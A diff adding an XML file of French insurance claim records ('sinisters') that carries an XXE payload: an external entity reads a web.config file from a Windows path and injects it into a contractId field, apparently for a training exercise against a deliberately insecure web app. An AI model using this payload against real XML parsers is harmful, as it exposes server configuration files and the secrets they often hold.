@@ -1,0 +1,14 @@
+<!DOCTYPE description [<!ELEMENT foo ANY >
+<!ENTITY bar SYSTEM "file:///C:/Users/T0156842/Documents/AXAFormation/InsecureWebApp/InsecureWebApp/web.config" >]>
+<sinisters>
+		<sinister>
+			<contractId>123456</contractId>
+			<type>IARD</type>
+			<description>Incendie garage</description>
+		</sinister>
+		<sinister>
+			<contractId>&bar;</contractId>
+			<type>IARD</type>
+			<description>Dégat des eaux</description>
+		</sinister>
+</sinisters>
